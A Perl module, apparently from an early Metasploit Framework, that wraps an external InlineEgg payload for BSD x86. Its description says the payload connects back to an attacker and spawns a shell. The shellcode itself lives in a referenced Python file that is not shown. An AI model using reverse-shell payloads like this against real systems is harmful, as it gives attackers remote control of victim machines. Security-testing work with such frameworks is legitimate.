package Msf::Payload::bsdx86_reverse_ie;
use strict;
use base 'Msf::PayloadComponent::ExternalPayload';
sub load {
  Msf::PayloadComponent::ExternalPayload->import('Msf::PayloadComponent::ReverseConnection');
}

my $info =
{
  'Name'         => 'bsdx86reverse_ie',
  'Version'      => '1.0',
  'Description'  => 'Connect back to attacker and spawn a shell',
  'Authors'      => [ 'gera[at]corest.com [InlineEgg License]', ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 0,
  'OS'           => [ 'bsd' ],
  'Multistage'   => 0,
  'Size'         => 0,
};

sub new {
  load();
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info}, @_);
  $self->{'Filename'} = $self->ScriptBase . '/payloads/external/bsdx86reverse_ie.py';
  $self->{'Info'}->{'Size'} = $self->_GenSize;
  return($self);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate({LHOST => '127.0.0.1', 'LPORT' => '4444',});
  return length($bin);
}
